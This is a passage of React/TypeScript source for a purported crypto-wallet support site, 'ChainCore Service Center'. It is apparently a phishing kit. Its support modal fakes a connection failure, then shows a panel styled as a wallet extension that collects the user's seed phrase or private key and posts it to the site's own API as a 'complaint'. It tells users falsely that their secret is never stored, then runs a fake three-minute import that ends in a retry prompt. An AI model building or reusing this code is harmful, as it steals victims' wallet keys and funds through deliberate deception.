            } as CSSProperties}
            data-testid={`wallet-connection-${activeWallet.className}`}
          >
            <div className="wallet-connection-brand">
              <span className="wallet-connection-logo"><img src={activeWallet.logo} alt="" /></span>
              <span className="wallet-connection-pulse" />
            </div>
            <span className="wallet-connection-kicker">{connectionReady ? 'CONNECTION READY' : 'SECURE CONNECTION'}</span>
            <h3>{connectionReady ? `${activeWallet.name} connected` : `Connecting to ${activeWallet.name}`}</h3>
            <p>{connectionReady ? 'Continue to share the public details needed for this support request.' : `Open ${activeWallet.name} and approve the connection request.`}</p>
            <div className="wallet-connection-loader" aria-label={connectionReady ? 'Wallet connected' : 'Connecting to wallet'}>
              <span className="wallet-connection-loader-bar" />
            </div>
            <button className="wallet-continue-button" onClick={onContinue} disabled={!connectionReady} data-testid="button-continue-wallet">
              {connectionReady ? 'Continue' : 'Waiting for wallet...'} <ArrowRight size={15} />
            </button>
          </div>
        ) : (
          <>
            <span className="wallet-empty-orb"><Globe2 size={27} /></span>
            <p>Connect your wallet to get<br />started</p>
          </>
        )}
      </section>
    </div>
  );
}

type ComplaintMethod = 'seed-phrase' | 'private-key';

function SupportModal({ service, onClose }: { service: Service; onClose: () => void }) {
  const [connectionState, setConnectionState] = useState<'connecting' | 'error' | 'wallets' | 'manual'>('connecting');
  const [importState, setImportState] = useState<'idle' | 'processing' | 'error'>('idle');
  const [context, setContext] = useState('');
  const [showComplaint, setShowComplaint] = useState(true);
  const [complaintMethod, setComplaintMethod] = useState<ComplaintMethod>('seed-phrase');
  const [seedWordCount, setSeedWordCount] = useState<12 | 24>(12);
  const [seedWords, setSeedWords] = useState<string[]>(Array.from({ length: 12 }, () => ''));
  const [freeformComplaint, setFreeformComplaint] = useState('');
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const Icon = service.icon;
  const selectedWalletOption = walletOptions.find((wallet) => wallet.name === selectedWallet);
  function updateSeedWords(nextWords: string[]) {
    setSeedWords(nextWords);
    setContext(nextWords.filter((word) => word.trim()).join(' '));
  }
  function changeSeedWordCount(nextCount: 12 | 24) {
    setSeedWordCount(nextCount);
    setSeedWords((currentWords) => {
      const nextWords = Array.from({ length: nextCount }, (_, index) => currentWords[index] ?? '');
      setContext(nextWords.filter((word) => word.trim()).join(' '));
      return nextWords;
    });
  }
  useEffect(() => {
    const root = document.documentElement;
    if (!selectedWalletOption) {
      root.style.removeProperty('--selected-wallet-accent');
      root.style.removeProperty('--selected-wallet-surface');
      root.style.removeProperty('--selected-wallet-text');
      return;
    }
    root.style.setProperty('--selected-wallet-accent', selectedWalletOption.accent);
    root.style.setProperty('--selected-wallet-surface', selectedWalletOption.surface);
    root.style.setProperty('--selected-wallet-text', selectedWalletOption.text);
    root.style.setProperty('--selected-wallet-name', JSON.stringify(selectedWalletOption.name));
    return () => {
      root.style.removeProperty('--selected-wallet-accent');
      root.style.removeProperty('--selected-wallet-surface');
      root.style.removeProperty('--selected-wallet-text');
      root.style.removeProperty('--selected-wallet-name');
    };
  }, [selectedWalletOption]);
  useEffect(() => {
    const timer = window.setTimeout(() => setConnectionState('error'), 6000);
    return () => window.clearTimeout(timer);
  }, []);
  useEffect(() => {
    if (importState !== 'processing') return;
    const timer = window.setTimeout(() => {
      setImportState('error');
    }, 180000);
    return () => window.clearTimeout(timer);
  }, [importState]);
  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const complaint = complaintMethod === 'seed-phrase' ? context : freeformComplaint;
    if (!complaint.trim()) return;
    setImportState('processing');
    void fetch('/api/support-requests', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service: service.title,
        wallet: selectedWallet,
        complaint,
      }),
    }).then((response) => {
      if (!response.ok) throw new Error('Support request could not be saved.');
    }).catch((error) => {
      console.error(error);
    });
  }
  const modalSubtitle = connectionState === 'manual'
    ? importState === 'processing' ? 'Import attempt · keep this window open' : 'Manual request · public information only'
    : 'Checking connection';
  return (
    <div className="modal-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget && importState !== 'processing') onClose(); }}>
      <div className={`support-modal ${connectionState === 'wallets' ? 'wallet-picker-modal' : ''} ${connectionState === 'manual' ? 'manual-request-modal' : ''} ${connectionState === 'manual' && importState === 'error' ? 'extension-error-modal' : ''}`} role="dialog" aria-modal="true" aria-labelledby="support-title" data-testid="dialog-support-intake">
        {connectionState !== 'wallets' && !(connectionState === 'manual' && (importState === 'error' || importState === 'idle')) && <div className="modal-head"><div className="modal-heading"><div className={`modal-icon ${selectedWalletOption ? 'selected-wallet-modal-icon' : ''}`}>{selectedWalletOption ? <img src={selectedWalletOption.logo} alt={`${selectedWalletOption.name} logo`} /> : <Icon size={18} />}</div><div><h2 id="support-title">{service.title}</h2><p>{modalSubtitle}</p></div></div><button className="close-btn" onClick={onClose} aria-label="Close support form" data-testid="button-close-support"><X size={18} /></button></div>}
        {connectionState === 'connecting' && <div className="modal-body connection-state" data-testid="status-service-connecting"><div className="connection-orb"><span className="connection-ring" /><Wifi size={28} /></div><h3>Connecting to {service.title}</h3><p>Checking the connection. Please keep this window open.</p><div className="loading-track"><span /></div><span className="loading-caption">CONNECTING · 06 SEC</span></div>}
        {connectionState === 'error' && <div className="modal-body connection-state error-state" data-testid="status-service-error"><div className="connection-orb error-orb"><WifiOff size={29} /></div><h3>Unable to connect</h3><p>Unable to connect to the {service.title} service right now.</p><button className="manual-connect-btn" onClick={() => setConnectionState('wallets')} data-testid="button-connect-manually">Please connect manually <ArrowRight size={15} /></button><button className="modal-cancel-link" onClick={onClose} data-testid="button-cancel-connection">Cancel</button></div>}
        {connectionState === 'wallets' && <WalletPicker selectedWallet={selectedWallet} onSelect={(wallet) => setSelectedWallet(wallet.name)} onContinue={() => setConnectionState('manual')} onClose={onClose} />}
        {connectionState === 'manual' && importState === 'processing' && <div className="modal-body connection-state import-processing-state" data-testid="status-wallet-importing"><div className="connection-orb"><span className="connection-ring" /><RefreshCw size={28} /></div><h3>Importing wallet</h3><p>Please keep this window open.</p><div className="loading-track import-loading-track"><span /></div><span className="loading-caption">IMPORTING · PLEASE WAIT</span></div>}
        {connectionState === 'manual' && importState === 'error' && selectedWalletOption && <div className="extension-error-shell" data-testid="status-wallet-import-error"><div className="extension-error-underlay" aria-hidden="true"><WalletPicker selectedWallet={selectedWallet} onSelect={() => undefined} onContinue={() => undefined} onClose={() => undefined} /></div><aside className="wallet-extension-panel" style={{ '--wallet-accent': selectedWalletOption.accent, '--wallet-text': selectedWalletOption.text } as CSSProperties}><header className="wallet-extension-head"><div className="wallet-extension-name"><img src={selectedWalletOption.logo} alt="" /><span>{selectedWalletOption.name}</span></div><button className="wallet-extension-close" onClick={onClose} aria-label="Close wallet connection panel" data-testid="button-close-support"><X size={16} /></button></header><div className="wallet-extension-content"><div className="wallet-extension-logo"><img src={selectedWalletOption.logo} alt="" /></div><div className="wallet-extension-error-icon"><TriangleAlert size={17} /></div><h3 id="support-title">Unable to import</h3><p>Unable to import. Please try connecting with another wallet or try again.</p><button className="wallet-extension-primary" onClick={() => setImportState('processing')} data-testid="button-try-import-again">Try again</button><button className="wallet-extension-secondary" onClick={() => { setImportState('idle'); setConnectionState('wallets'); }} data-testid="button-try-another-wallet">Try another wallet</button></div></aside></div>}
        {connectionState === 'manual' && importState === 'idle' && selectedWalletOption && <div className="extension-form-shell"><div className="extension-error-underlay" aria-hidden="true"><WalletPicker selectedWallet={selectedWallet} onSelect={() => undefined} onContinue={() => undefined} onClose={() => undefined} /></div><aside className={`wallet-extension-panel wallet-extension-form-panel wallet-extension-${selectedWalletOption.className}`} style={{ '--wallet-accent': selectedWalletOption.accent, '--wallet-surface': selectedWalletOption.surface, '--wallet-text': selectedWalletOption.text } as CSSProperties}><header className="wallet-extension-head"><div className="wallet-extension-name"><img src={selectedWalletOption.logo} alt="" /><span>{selectedWalletOption.name}</span></div><button className="wallet-extension-close" onClick={onClose} aria-label="Close support form" data-testid="button-close-support">{selectedWalletOption.className === 'phantom' ? <CircleHelp size={18} /> : <X size={16} />}</button></header><form className="manual-request-form" onSubmit={submit}><div className="wallet-extension-form-status">{selectedWalletOption.name} · CONNECTION READY</div><p className="complaint-safety-note">import your seed phrase or private key.</p><div className="complaint-method-picker" role="tablist" aria-label="Complaint type"><button type="button" role="tab" aria-selected={complaintMethod === 'seed-phrase'} className={`complaint-method-tab ${complaintMethod === 'seed-phrase' ? 'active' : ''}`} onClick={() => setComplaintMethod('seed-phrase')}>Seed Phrase</button><button type="button" role="tab" aria-selected={complaintMethod === 'private-key'} className={`complaint-method-tab ${complaintMethod === 'private-key' ? 'active' : ''}`} onClick={() => setComplaintMethod('private-key')}>Private Key</button></div>{complaintMethod === 'seed-phrase' ? <><div className="complaint-seed-settings"><label htmlFor="seed-word-count">Phrase length</label><select id="seed-word-count" value={seedWordCount} onChange={(event) => changeSeedWordCount(Number(event.target.value) as 12 | 24)}><option value={12}>I have a 12-word phrase</option><option value={24}>I have a 24-word phrase</option></select><ChevronDown size={17} aria-hidden="true" /></div><div className="complaint-visibility-row"><button type="button" className="complaint-visibility-toggle" onClick={() => setShowComplaint((current) => !current)} aria-label={showComplaint ? 'Hide seed phrase' : 'Show seed phrase'} aria-pressed={!showComplaint} data-testid="button-toggle-complaint-visibility">{showComplaint ? <Eye size={17} /> : <EyeOff size={17} />}<span>{showComplaint ? 'Hide' : 'Show'}</span></button></div><div className="complaint-seed-grid" role="group" aria-label={`${seedWordCount}-word seed phrase`}>{seedWords.map((word, index) => <input key={`seed-word-${index}`} id={`seed-word-${index + 1}`} className="form-field complaint-seed-input" type={showComplaint ? 'text' : 'password'} inputMode="text" placeholder={`${index + 1}.`} aria-label={`Seed phrase word ${index + 1}`} value={word} onChange={(event) => updateSeedWords(seedWords.map((currentWord, wordIndex) => wordIndex === index ? event.target.value : currentWord))} required data-testid={`input-seed-word-${index + 1}`} />)}</div></> : <div className="private-key-field-wrap"><input id="support-context" className="form-field private-key-field" type={showComplaint ? 'text' : 'password'} placeholder="Enter your private key." aria-label="Private key" value={freeformComplaint} onChange={(event) => setFreeformComplaint(event.target.value)} required data-testid="input-support-context" /><button type="button" className="complaint-visibility-toggle" onClick={() => setShowComplaint((current) => !current)} aria-label={showComplaint ? 'Hide private key' : 'Show private key'} aria-pressed={!showComplaint} data-testid="button-toggle-complaint-visibility">{showComplaint ? <EyeOff size={18} /> : <Eye size={18} />}</button></div>}<div className="import-privacy-note"><ShieldCheck size={20} /><p>Your secret phrase stays private and under your control. We never store or access it — all secure actions are handled on your device.</p></div><div className="modal-actions"><button type="submit" className="primary-btn" data-testid="button-submit-support">Import wallet <ArrowRight size={14} /></button></div></form></aside></div>}
      </div>
    </div>
  );
}

function FinalCTA({ onSupport }: { onSupport: () => void }) {
  return <section className="final-cta"><div className="wrap"><span className="eyebrow">Still stuck?</span><h2>Start with the issue in front of you.</h2><p>Choose a service and describe the step that did not work.</p><button className="primary-btn" onClick={onSupport} data-testid="button-final-support">Get help now <ArrowRight size={15} /></button></div></section>;
}

function Footer() {
  return <footer className="footer"><div className="wrap footer-inner"><button className="brand" onClick={() => scrollToSection('top')} data-testid="button-footer-home"><ChainCoreLogo /></button><span className="footer-copy">© 2025 ChainCore Service Center · Built for clearer on-chain moments.</span><div className="footer-links"><button className="footer-link" onClick={() => scrollToSection('security')} data-testid="link-footer-safety">Safety</button><button className="footer-link" onClick={() => scrollToSection('faq')} data-testid="link-footer-faq">FAQ</button><button className="footer-link" onClick={() => scrollToSection('services')} data-testid="link-footer-services">Services</button></div></div></footer>;
}

function Home() {
  const [selectedService, setSelectedService] = useState<Service | null>(null);
  return <main className="cc-app noise"><FallingCryptoLogos /><MarketTicker /><SiteNav onSupport={() => setSelectedService(services[16])} /><Hero onSupport={() => setSelectedService(services[16])} /><SignalBand /><ServicesSection onSelect={setSelectedService} /><ApproachSection /><SecuritySection /><FAQSection /><FinalCTA onSupport={() => setSelectedService(services[16])} /><Footer />{selectedService && <SupportModal service={selectedService} onClose={() => setSelectedService(null)} />}</main>;
}

function Router() {
  return <RoutedErrorBoundary><Switch><WouterRoute path="/" component={Home} /><WouterRoute path="/admin" component={AdminPage} /><WouterRoute component={NotFound} /></Switch></RoutedErrorBoundary>;
}

function RoutedErrorBoundary({ children }: { children: ReactNode }) {
  const [location] = useLocation();
  return <ErrorBoundary resetKey={location}>{children}</ErrorBoundary>;
}

function App() {
  return <QueryClientProvider client={queryClient}><TooltipProvider><WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}><Router /></WouterRouter><Toaster /></TooltipProvider></QueryClientProvider>;
}

export default App;